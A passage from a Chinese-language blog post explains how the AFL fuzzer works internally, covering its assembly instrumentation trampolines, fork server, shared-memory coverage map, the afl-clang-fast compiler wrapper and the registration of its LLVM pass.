class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;.align 4<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;leal -16(%%esp), %%esp<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl %%edi,  0(%%esp)<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl %%edx,  4(%%esp)<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl %%ecx,  8(%%esp)<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl %%eax, 12(%%esp)<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl $0x%08x, %%ecx<span class="hljs-subst">\n</span>&quot;</span>    <span class="hljs-comment">// 向 ecx 中存入识别代码块的随机桩代码 id</span><br>  <span class="hljs-string">&quot;call __afl_maybe_log<span class="hljs-subst">\n</span>&quot;</span>   <span class="hljs-comment">// 调用 __afl_maybe_log 函数</span><br>  <span class="hljs-string">&quot;movl 12(%%esp), %%eax<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl  8(%%esp), %%ecx<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl  4(%%esp), %%edx<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movl  0(%%esp), %%edi<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;leal 16(%%esp), %%esp<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;/* --- END --- */<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>;<br><br><span class="hljs-keyword">static</span> const u8<span class="hljs-operator">*</span> trampoline_fmt_64 <span class="hljs-operator">=</span><br><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;.align 4<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;leaq -(128+24)(%%rsp), %%rsp<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movq %%rdx,  0(%%rsp)<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movq %%rcx,  8(%%rsp)<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movq %%rax, 16(%%rsp)<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movq $0x%08x, %%rcx<span class="hljs-subst">\n</span>&quot;</span>  <span class="hljs-comment">// 64 位下使用的寄存器为 rcx</span><br>  <span class="hljs-string">&quot;call __afl_maybe_log<span class="hljs-subst">\n</span>&quot;</span> <span class="hljs-comment">// 调用 __afl_maybe_log 函数</span><br>  <span class="hljs-string">&quot;movq 16(%%rsp), %%rax<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movq  8(%%rsp), %%rcx<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;movq  0(%%rsp), %%rdx<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;leaq (128+24)(%%rsp), %%rsp<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;/* --- END --- */<span class="hljs-subst">\n</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>;<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>编译之后的桩代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">.text:00000000004009C0                 lea     rsp, [rsp-98h]<br>.text:00000000004009C8                 mov     [rsp+98h+var_98], rdx<br>.text:00000000004009CC                 mov     [rsp+98h+var_90], rcx<br>.text:00000000004009D1                 mov     [rsp+98h+var_88], rax<br>.text:00000000004009D6                 mov     rcx, 2359h<br>.text:00000000004009DD                 call    __afl_maybe_log<br>.text:00000000004009E2                 mov     rax, [rsp+98h+var_88]<br>.text:00000000004009E7                 mov     rcx, [rsp+98h+var_90]<br>.text:00000000004009EC                 mov     rdx, [rsp+98h+var_98]<br>.text:00000000004009F0                 lea     rsp, [rsp+98h]<br></code></pre></td></tr></table></figure>

<p>从 main_payload_64 中的主要变量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">.AFL_VARS:<br><br>  .comm   __afl_area_ptr, 8            # 共享内存地址<br>  .comm   __afl_prev_loc, 8            # 上一个插桩位置（id为之前的R(MAP_SIZE)随机数的值）<br>  .comm   __afl_fork_pid, 4            # 由fork产生的子进程的pid<br>  .comm   __afl_temp, 4                # 缓冲区<br>  .comm   __afl_setup_failure, 1       # 标志位，如果置位则直接退出<br>  .comm    __afl_global_area_ptr, 8, 8 # 全局指针<br></code></pre></td></tr></table></figure>

<h5 id="main-payload-——-afl-maybe-log"><a href="#main-payload-——-afl-maybe-log" class="headerlink" title="main_payload —— __afl_maybe_log"></a>main_payload —— __afl_maybe_log</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">__afl_maybe_log:   /* 源码删除无关内容后 */<br><br>  lahf<br>  seto  %al<br><br>  /* Check if SHM region is already mapped. */<br><br>  movq  __afl_area_ptr(%rip), %rdx<br>  testq %rdx, %rdx<br>  je    __afl_setup<br></code></pre></td></tr></table></figure>

<p>首先，使用 <code>lahf</code> 指令（加载状态标志位到<code>AH</code>）将EFLAGS寄存器的低八位复制到 <code>AH</code>，被复制的标志位包括：符号标志位（SF）、零标志位（ZF）、辅助进位标志位（AF）、奇偶标志位（PF）和进位标志位（CF），使用该指令可以方便地将标志位副本保存在变量中；</p>
<p>然后，使用 <code>seto</code> 指令，如果存在溢出，则将 al 设置为 1；</p>
<p>接下来检查共享内存是否进行了设置，判断 <code>__afl_area_ptr</code> 是否为NULL：</p>
<ul>
<li>如果为 NULL，跳转到 <code>__afl_setup</code> 函数进行设置；</li>
<li>如果不为 NULL，继续进行。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">__afl_setup:<br><br>        /* Do not retry setup is we had previous failues. */<br>        cmpb $0, __afl_setup_failure(%rip)<br>        jne __afl_return<br><br>        /* Check out if we have a global pointer on file. */<br>        movq __afl_global_area_ptr(%rip), %rdx<br>        testq %rdx, %rdx<br>        je __afl_setup_first<br><br>        movq %rdx, __afl_area_ptr(%rip)<br>        jmp  __afl_store<br></code></pre></td></tr></table></figure>

<p>首先，检查 <code>__afl_setup_failure</code> 是否为0，为 0 直接跳转到 <code>__afl_return</code> 返回；</p>
<p>然后，检查 <code>__afl_global_area_ptr</code> 文件指针是否为 NULL：</p>
<ul>
<li>如果为 NULL，跳转到 <code>__afl_setup_first</code> 进行初始化的工作；</li>
<li>如果不为 NULL，将 <code>__afl_global_area_ptr</code> 的值赋给 <code>__afl_area_ptr</code>，然后跳转到 <code>__afl_store</code> 。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">__afl_setup_first:<br><br>  /* Save everything that is not yet saved and that may be touched by<br>     getenv() and several other libcalls we&#x27;ll be relying on. */<br><br>  leaq -352(%rsp), %rsp<br><br>  movq %rax,   0(%rsp)<br>  movq %rcx,   8(%rsp)<br>  movq %rdi,  16(%rsp)<br>  movq %rsi,  32(%rsp)<br>  movq %r8,   40(%rsp)<br>  movq %r9,   48(%rsp)<br>  movq %r10,  56(%rsp)<br>  movq %r11,  64(%rsp)<br><br>  movq %xmm0,  96(%rsp)<br>  movq %xmm1,  112(%rsp)<br>  movq %xmm2,  128(%rsp)<br>  movq %xmm3,  144(%rsp)<br>  movq %xmm4,  160(%rsp)<br>  movq %xmm5,  176(%rsp)<br>  movq %xmm6,  192(%rsp)<br>  movq %xmm7,  208(%rsp)<br>  movq %xmm8,  224(%rsp)<br>  movq %xmm9,  240(%rsp)<br>  movq %xmm10, 256(%rsp)<br>  movq %xmm11, 272(%rsp)<br>  movq %xmm12, 288(%rsp)<br>  movq %xmm13, 304(%rsp)<br>  movq %xmm14, 320(%rsp)<br>  movq %xmm15, 336(%rsp)<br><br>  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */<br><br>  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the<br>     original stack ptr in the callee-saved r12. */<br><br>  pushq %r12<br>  movq  %rsp, %r12<br>  subq  $16, %rsp<br>  andq  $0xfffffffffffffff0, %rsp<br><br>  leaq .AFL_SHM_ENV(%rip), %rdi<br>call _getenv<br><br>  testq %rax, %rax<br>  je    __afl_setup_abort<br><br>  movq  %rax, %rdi<br>call _atoi<br><br>  xorq %rdx, %rdx   /* shmat flags    */<br>  xorq %rsi, %rsi   /* requested addr */<br>  movq %rax, %rdi   /* SHM ID         */<br>call _shmat<br><br>  cmpq $-1, %rax<br>  je   __afl_setup_abort<br><br>  /* Store the address of the SHM region. */<br><br>  movq %rax, %rdx<br>  movq %rax, __afl_area_ptr(%rip)<br><br>  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx<br>  movq %rax, (%rdx)<br>  <br>  movq %rax, %rdx<br>  __afl_forkserver:<br></code></pre></td></tr></table></figure>

<p>首先，保存所有寄存器的值，包括 <code>xmm</code> 寄存器组；</p>
<p>然后，进行栈对齐；</p>
<p>然后，调用 <code>_getenv</code> 获取环境变量 .AFL_SHM_ENV(“SHM_ENV_VAR”)，该环境变量保存的是共享内存的 ID：</p>
<ul>
<li>如果获取失败，跳转到 <code>__afl_setup_abort</code> ；</li>
<li>如果获取成功，先调用 <code>_atoi</code>把 ID 转为 int 数值，再调用 <code>_shmat</code> ，启用对共享内存的访问，启用失败则跳转到 <code>__afl_setup_abort</code>。</li>
</ul>
<p>接下来，将 <code>_shmat</code> 返回的共享内存地址存储在 <code>__afl_area_ptr</code> 和 <code>__afl_global_area_ptr</code> 变量中。</p>
<p>后面按序执行到 <code>__afl_forkserver</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">__afl_forkserver:<br><br>     /* Enter the fork server mode to avoid the overhead of execve() calls. We<br>     push rdx (area ptr) twice to keep stack alignment neat. */<br><br>  pushq %rdx<br>  pushq %rdx<br><br>  /* Phone home and tell the parent that we&#x27;re OK. (Note that signals with<br>     no SA_RESTART will mess it up). If this fails, assume that the fd is<br>     closed because we were execve()d from an instrumented binary, or because<br>     the parent doesn&#x27;t want to use the fork server. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi       /* file desc */<br>CALL_L64(&quot;write&quot;)<br><br>  cmpq $4, %rax<br>  jne  __afl_fork_resume<br>  <br>  __afl_fork_wait_loop:<br></code></pre></td></tr></table></figure>

<p>这一段实现的主要功能是往 <code>FORKSRV_FD + 1</code> （也就是 198+1）号描述符中（即状态管道）中， 写入<code>__afl_temp</code>上的 4 个字节内容，用来告知 fork server 已经成功启动。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">__afl_fork_wait_loop:<br><br>  /* Wait for parent by reading from the pipe. Abort if read fails. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi            /* file desc */<br>CALL_L64(&quot;read&quot;)<br>  cmpq $4, %rax<br>  jne  __afl_die<br><br>  /* Once woken up, create a clone of our process. This is an excellent use<br>     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly<br>     caches getpid() results and offers no way to update the value, breaking<br>     abort(), raise(), and a bunch of other things :-( */<br><br>CALL_L64(&quot;fork&quot;)<br>  cmpq $0, %rax<br>  jl   __afl_die<br>  je   __afl_fork_resume<br><br>  /* In parent process: write PID to pipe, then wait for child. */<br><br>  movl %eax, __afl_fork_pid(%rip)<br><br>  movq $4, %rdx                   /* length    */<br>  leaq __afl_fork_pid(%rip), %rsi /* data      */<br>  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi             /* file desc */<br>CALL_L64(&quot;write&quot;)<br><br>  movq $0, %rdx                   /* no flags  */<br>  leaq __afl_temp(%rip), %rsi     /* status    */<br>  movq __afl_fork_pid(%rip), %rdi /* PID       */<br>CALL_L64(&quot;waitpid&quot;)<br>  cmpq $0, %rax<br>  jle  __afl_die<br><br>  /* Relay wait status to pipe, then loop back. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;, %rdi         /* file desc */<br>CALL_L64(&quot;write&quot;)<br><br>  jmp  __afl_fork_wait_loop<br></code></pre></td></tr></table></figure>

<ul>
<li>等待fuzzer通过 <code>FORKSRV_FD</code>（ 控制管道）发送过来的命令，读入到 <code>__afl_temp</code> 中：<ul>
<li>读取失败，跳转到 <code>__afl_die</code> ，结束循环；</li>
<li>读取成功，继续往下执行；</li>
</ul>
</li>
<li>fork 一个子进程，子进程跳转执行 <code>__afl_fork_resume</code>；</li>
<li>将子进程的 pid 赋给 <code>__afl_fork_pid</code>，并写到状态管道中通知父进程；</li>
<li>等待子进程执行完成，写入状态管道告知 fuzzer；</li>
<li>重新执行下一轮 <code>__afl_fork_wait_loop</code> </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">__afl_fork_resume:<br><br>/* In child process: close fds, resume execution. */<br><br>  movq $&quot; STRINGIFY(FORKSRV_FD) &quot;, %rdi<br>CALL_L64(&quot;close&quot;)<br><br>  movq $(&quot; STRINGIFY(FORKSRV_FD) &quot; + 1), %rdi<br>CALL_L64(&quot;close&quot;)<br><br>  popq %rdx<br>  popq %rdx<br><br>  movq %r12, %rsp<br>  popq %r12<br><br>  movq  0(%rsp), %rax<br>  movq  8(%rsp), %rcx<br>  movq 16(%rsp), %rdi<br>  movq 32(%rsp), %rsi<br>  movq 40(%rsp), %r8<br>  movq 48(%rsp), %r9<br>  movq 56(%rsp), %r10<br>  movq 64(%rsp), %r11<br><br>  movq  96(%rsp), %xmm0<br>  movq 112(%rsp), %xmm1<br>  movq 128(%rsp), %xmm2<br>  movq 144(%rsp), %xmm3<br>  movq 160(%rsp), %xmm4<br>  movq 176(%rsp), %xmm5<br>  movq 192(%rsp), %xmm6<br>  movq 208(%rsp), %xmm7<br>  movq 224(%rsp), %xmm8<br>  movq 240(%rsp), %xmm9<br>  movq 256(%rsp), %xmm10<br>  movq 272(%rsp), %xmm11<br>  movq 288(%rsp), %xmm12<br>  movq 304(%rsp), %xmm13<br>  movq 320(%rsp), %xmm14<br>  movq 336(%rsp), %xmm15<br><br>  leaq 352(%rsp), %rsp<br><br>  jmp  __afl_store<br></code></pre></td></tr></table></figure>

<ul>
<li>关闭子进程中的 fd；</li>
<li>恢复子进程的寄存器状态；</li>
<li>跳转到 <code>__afl_store</code> 执行。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">__afl_store:<br><br>  /* Calculate and store hit for the code location specified in rcx. */<br><br>  xorq __afl_prev_loc(%rip), %rcx<br>  xorq %rcx, __afl_prev_loc(%rip)<br>  shrq $1, __afl_prev_loc(%rip)<br><br>  incb (%rdx, %rcx, 1)<br>  <br>_afl_return:<br>  addb $127, %al<br>  sahf<br>  ret<br></code></pre></td></tr></table></figure>

<ul>
<li>rcx 存储的是 R(MAP_SIZE) 随机数，值在 0~((1 &lt;&lt; 16) - 1) 之间，是当前桩的一个 id。</li>
<li>将 <code>__afl_prev_loc</code> 与 rcx 异或两次，最终把值赋给 <code>__afl_prev_loc</code>。可以看见，当第一个进程执行到这时，<code>__afl_prev_loc</code>为 0，最终会被赋值为当前桩 id 逻辑右移一位的值。</li>
<li>最后在共享内存（rdx存储的地址指向共享内存）中存储当前插桩位置的地方计数加一。</li>
</ul>
<h2 id="afl-clang-fast"><a href="#afl-clang-fast" class="headerlink" title="afl-clang-fast"></a>afl-clang-fast</h2><p>AFL 对于上述通过<code>afl-gcc</code>来插桩这种做法已经属于不建议，并提供了更好的工具 afl-clang-fast，通过 llvm pass 来插桩。</p>
<h3 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h3><p>LLVM 是一个编译器框架，主要为了解决编译时多种多样的前端和后端导致编译环境复杂、苛刻的问题，LLVM IR 是 LLVM 的中间表示，并以库的形式提供一些列接口，以提供诸如操作 IR、生成目标平台代码等等后端的功能。其整体架构如下所示：</p>
<p><img src="/2022/07/19/2022-07-20-%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94Fuzz/image-20230222191158864.png"><span class="image-caption">image-20230222191158864</span></p>
<p>不同的前端和后端使用统一的中间代码，因此，如果需要支持一门新的编程语言，只需要实现一个新的前端；如果需要支持一款新的硬件设备，只需要实现一个新的后端，而优化阶段为通用阶段，依靠的是统一的 LLVM IR ，与新的编程语言和硬件设备无关。</p>
<p>Clang 是 LLVM 项目的一个子项目，它是 LLVM 架构下的 C/C++/Objective-C 的编译器，是 LLVM 前端的一部分。相较于 GCC，具备编译速度快、占用内存少、模块化设计、诊断信息可读性强、设计清晰简单等优点。</p>
<p>代码首先由编译器前端 clang 处理后得到中间代码 IR，然后经过各 LLVM Pass 进行优化和转换，最终交给编译器后端生成机器码。（以 Clang 做编译器为例）：</p>
<p><img src="/2022/07/19/2022-07-20-%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94Fuzz/image-20230222191953401.png"><span class="image-caption">image-20230222191953401</span></p>
<p>LLVM Pass 是一些中间过程，用户可以自定义其内容，因此可以遍历、修改 IR 以达到插桩、优化、静态分析等目的。</p>
<h3 id="clang-wrapper"><a href="#clang-wrapper" class="headerlink" title="clang wrapper"></a>clang wrapper</h3><p>​    <code>afl-clang-fast.c</code>和之前的<code>afl-gcc</code>一样，是 clang 的一层 wrapper；只是定义了一些宏，和传递了一些参数给 clang。</p>
<h4 id="find-obj"><a href="#find-obj" class="headerlink" title="find_obj"></a>find_obj</h4><p>通过查找<code>afl-llvm-rt.o</code>所在路径，从而确定<code>obj_path</code>的值。</p>
<ul>
<li>先检查环境变量<code>AFL_PATH</code>是否存在，如果存在，接着检查 <code>AFL_PATH</code>拼接上 <code>/afl-llvm-rt.o</code>是否可读，如果可读就把该路径赋值给<code>obj_path</code>，然后直接返回。</li>
<li>如果不存在环境变量<code>AFL_PATH</code> ，则检查 arg0 中是否存在 ‘/‘，存在的则将最后一个 ‘/‘ 位置之前的路径赋值给 dir，例如<code>~/AFL/afl-clang-fast</code>则把 <code>~/AFL</code>赋值给 dir。接着检查 dir 拼接上<code>/afl-llvm-rt.o</code>是否可读，如果可读就把该路径赋值给<code>obj_path</code>，然后直接返回。</li>
<li>如果都不存在时，因为默认的 AFL 的 MakeFile 在编译的时候，会定义一个名为<code>AFL_PATH</code>的宏，其指向<code>/usr/local/lib/afl</code>，会到这里查看是否存在<code>afl-llvm-rt.o</code>，如果存在设置<code>obj_path</code>并直接返回。</li>
<li>如果上述三种方式都找不到，则抛出异常。</li>
</ul>
<h4 id="edit-params-2"><a href="#edit-params-2" class="headerlink" title="edit_params"></a>edit_params</h4><p>将 argv 的参数拷贝到 cc_params，同时设置一些必要的参数。</p>
<ul>
<li><p>获取 argv[0] 的值，判断执行的是<code>afl-clang-fast</code>还是<code>afl-clang-fast++</code></p>
<ul>
<li>如果执行的是<code>afl-clang-fast</code>，则读取环境变量<code>AFL_CXX</code>，如果存在，则将其值赋值给<code>cc_params[0]</code>，否则将 clang++ 赋值给<code>cc_params[0]</code>。</li>
<li>如果执行的是<code>afl-clang-fast++</code>则读取环境变量<code>AFL_CC</code>，如果存在，则将其值赋值给<code>cc_params[0]</code>，否则将 clang 赋值给<code>cc_params[0]</code>。</li>
</ul>
</li>
<li><p>默认情况下，我们通过<code>afl-llvm-pass.so</code>来注入 instrumentation，但是现在也支持<code>trace-pc-guard</code>模式，详情可以参考<a href="http://clang.llvm.org/docs/SanitizerCoverage.html#tracing-pcs-with-guards">llvm的文档</a></p>
</li>
<li><p>然后如果定义了<code>USE_TRACE_PC</code>宏，就将<code>-fsanitize-coverage=trace-pc-guard -mllvm -sanitizer-coverage-block-threshold=0</code>添加到<code>cc_params</code>里。</p>
</li>
<li><p>如果没有定义，就依次将<code>-Xclang -load -Xclang obj_path/afl-llvm-pass.so -Qunused-arguments</code>添加到<code>cc_params</code>里。</p>
</li>
<li><p>循环依次读取传递给<code>afl-clang-fast</code>的参数，并添加到<code>cc_params</code>里，同时做一些检查和设置：</p>
<ul>
<li>如果传入参数里有<code>-m32</code>或者<code>armv7a-linux-androideabi</code>，则设置<code>bit_mode</code>为 32。</li>
<li>如果传入参数里有<code>-m64</code>，则设置<code>bit_mode</code>为 64</li>
<li>如果传入参数里有<code>-x</code>，则设置<code>x_set</code>为 1</li>
<li>如果传入参数里有<code>-fsanitize=address</code>或者<code>-fsanitize=memory</code>，则设置<code>asan_set</code>为 1</li>
<li>如果传入参数里有<code>-Wl,-z,defs</code>或者<code>-Wl,--no-undefined</code>，直接 continue，不将其添加到<code>cc_params</code>里 。</li>
</ul>
</li>
<li><p>读取环境变量<code>AFL_HARDEN</code>，如果存在，则往<code>cc_params</code>里添加<code>-fstack-protector-all</code>；并且如果 fortify_set 为 0，往<code>cc_params</code>里添加<code>-D_FORTIFY_SOURCE=2</code>。</p>
</li>
<li><p>如果参数里没有<code>-fsanitize=address/memory</code>，即 asan_set 是 0，则读取环境变量<code>AFL_USE_ASAN</code>，如果存在就添加<code>-U_FORTIFY_SOURCE -fsanitize=address</code>到<code>cc_params</code>里，环境变量<code>AFL_USE_MSAN</code>则是添加<code>-U_FORTIFY_SOURCE -fsanitize=memory</code>，并且和<code>AFL_HARDEN</code>三者是互相排斥的。</p>
</li>
<li><p>如果定义了<code>USE_TRACE_PC</code>宏，检查是否存在环境变量<code>AFL_INST_RATIO</code>，如果存在就抛出异常<code>AFL_INST_RATIO not available at compile time with &#39;trace-pc&#39;.</code>。</p>
</li>
<li><p>读取环境变量<code>AFL_DONT_OPTIMIZE</code>，如果不存在则添加<code>-g -O3 -funroll-loops</code>到<code>cc_params</code>里。</p>
</li>
<li><p>读取环境变量<code>AFL_NO_BUILTIN</code>，如果存在就添加<code>-fno-builtin-strcmp</code>等。</p>
</li>
<li><p>接着，往<code>cc_params</code>添加参数<code>-D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</code>，以及定义一些宏。</p>
</li>
<li><p>如果 x_set 为 1，则添加参数<code>-x none</code>。</p>
</li>
<li><p>根据<code>bit_mode</code>的值选择<code>afl-llvm-rt</code>：</p>
<ul>
<li>如果为 0，即没有<code>-m32</code>和<code>-m64</code>选项，就向参数里添加<code>obj_path/afl-llvm-rt.o</code></li>
<li>如果为 32，添加<code>obj_path/afl-llvm-rt-32.o</code></li>
<li>如果为 64，添加<code>obj_path/afl-llvm-rt-64.o</code></li>
</ul>
</li>
<li><p>最后以 NULL 结尾，停止添加参数。</p>
</li>
</ul>
<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><ul>
<li>寻找 obj_path 路径。</li>
<li>编辑参数 cc_params。</li>
<li>最后执行设置好的命令参数<code>execvp(cc_params[0], (char**)cc_params);</code>。</li>
</ul>
<h3 id="afl-llvm-pass-so-cc"><a href="#afl-llvm-pass-so-cc" class="headerlink" title="afl-llvm-pass.so.cc"></a>afl-llvm-pass.so.cc</h3><p>afl-llvm-pass 里只有一个 Transform pass AFLCoverage，其继承自 ModulePass，所以我们主要分析一下它的<code>runOnModule</code>函数。</p>
<h4 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h4><p>Module 相当于程序，里面包含所有 Function 和全局变量，而 Function 里包含所有 BasicBlock 和函数参数，BasicBlock 里包含所有 Instruction，Instruction 包含 Opcode 和 Operands。</p>
<p><img src="/2022/07/19/2022-07-20-%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94Fuzz/image-20230303100507191.png"><span class="image-caption">image-20230303100507191</span></p>
<h4 id="注册-pass"><a href="#注册-pass" class="headerlink" title="注册 pass"></a>注册 pass</h4><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">registerAFLPass</span><span class="hljs-params">(<span class="hljs-keyword">const</span> PassManagerBuilder &amp;,</span></span><br><span class="hljs-params"><span class="hljs-function">                            legacy::PassManagerBase &amp;PM)</span> </span>&#123;<br><br>  PM.<span class="hljs-built_in">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">AFLCoverage</span>());<br><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> RegisterStandardPasses <span class="hljs-title">RegisterAFLPass</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PassManagerBuilder::EP_ModuleOptimizerEarly, registerAFLPass)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> RegisterStandardPasses <span class="hljs-title">RegisterAFLPass0</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PassManagerBuilder::EP_EnabledOnOptLevel0, registerAFLPass)</span></span>;<br></code></pre></td></tr></table></figure>

<p>其核心功能为向 PassManager 注册新的 pass，每个 pass 相互独立，通过PM统一注册和调度，更加模块化。不理解的可以参考下面的代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/// Registers a function for adding a standard set of passes.  This should be</span><br><span class="hljs-comment">/// used by optimizer plugins to allow all front ends to transparently use</span><br><span class="hljs-comment">/// them.  Create a static instance of this class in your plugin, providing a</span><br><span class="hljs-comment">/// private function that the PassManagerBuilder can use to add your passes.</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegisterStandardPasses</span> &#123;</span><br>  PassManagerBuilder::GlobalExtensionID ExtensionID;<br><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">RegisterStandardPasses</span>(PassManagerBuilder::ExtensionPointTy Ty,<br>                         PassManagerBuilder::ExtensionFn Fn) &#123;<br>    ExtensionID = PassManagerBuilder::<span class="hljs-built_in">addGlobalExtension</span>(Ty, std::<span class="hljs-built_in">move</span>(Fn));<br>  &#125;<br><br>  ~<span class="hljs-built_in">RegisterStandardPasses</span>() &#123;<br>  ...<br>  &#125;<br>&#125;;<br><br>...<br><span class="hljs-comment">/// PassManagerBuilder - This class is used to set up a standard optimization</span><br><span class="hljs-comment">/// sequence for languages like C and C++, allowing some APIs to customize the</span><br><span class="hljs-comment">/// pass sequence in various ways. A simple example of using it would be:</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">///  PassManagerBuilder Builder;</span><br><span class="hljs-comment">///  Builder.OptLevel = 2;</span><br><span class="hljs-comment">///  Builder.populateFunctionPassManager(FPM);</span><br><span class="hljs-comment">///  Builder.populateModulePassManager(MPM);</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// In addition to setting up the basic passes, PassManagerBuilder allows</span><br><span class="hljs-comment">/// frontends to vend a plugin API, where plugins are allowed to add extensions</span><br><span class="hljs-comment">/// to the default pass manager.  They do this by specifying where in the pass</span><br><span class="hljs-comment">/// pipeline they want to be added, along with a callback function that adds</span><br><span class="hljs-comment">/// the pass(es).  For example, a plugin that wanted to add a loop optimization</span><br><span class="hljs-comment">/// could do something like this:</span><br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// static void addMyLoopPass(const PMBuilder &amp;Builder, PassManagerBase &amp;PM) &#123;</span><br><span class="hljs-comment">///   if (Builder.getOptLevel() &gt; 2 &amp;&amp; Builder.getOptSizeLevel() == 0)</span><br><span class="hljs-comment">///     PM.add(createMyAwesomePass());</span><br><span class="hljs-comment">/// &#125;</span><br><span class="hljs-comment">///   ...</span><br><span class="hljs-comment">///   Builder.addExtension(PassManagerBuilder::EP_LoopOptimizerEnd,</span><br><span class="hljs-comment">///                        addMyLoopPass);</span><br><span class="hljs-comment">///   ...</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PassManagerBuilder</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-comment">/// Extensions are passed to the builder itself (so they can see how it is</span><br>  <span class="hljs-comment">/// configured) as well as the pass manager to add stuff to.</span><br>  <span class="hljs-keyword">typedef</span> std::function&lt;<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(<span class="hljs-keyword">const</span> PassManagerBuilder &amp;Builder,<br>                             legacy::PassManagerBase &amp;PM)&gt;<br>      ExtensionFn;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> GlobalExtensionID;<br><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ExtensionPointTy</span> &#123;</span><br>    <span class="hljs-comment">/// 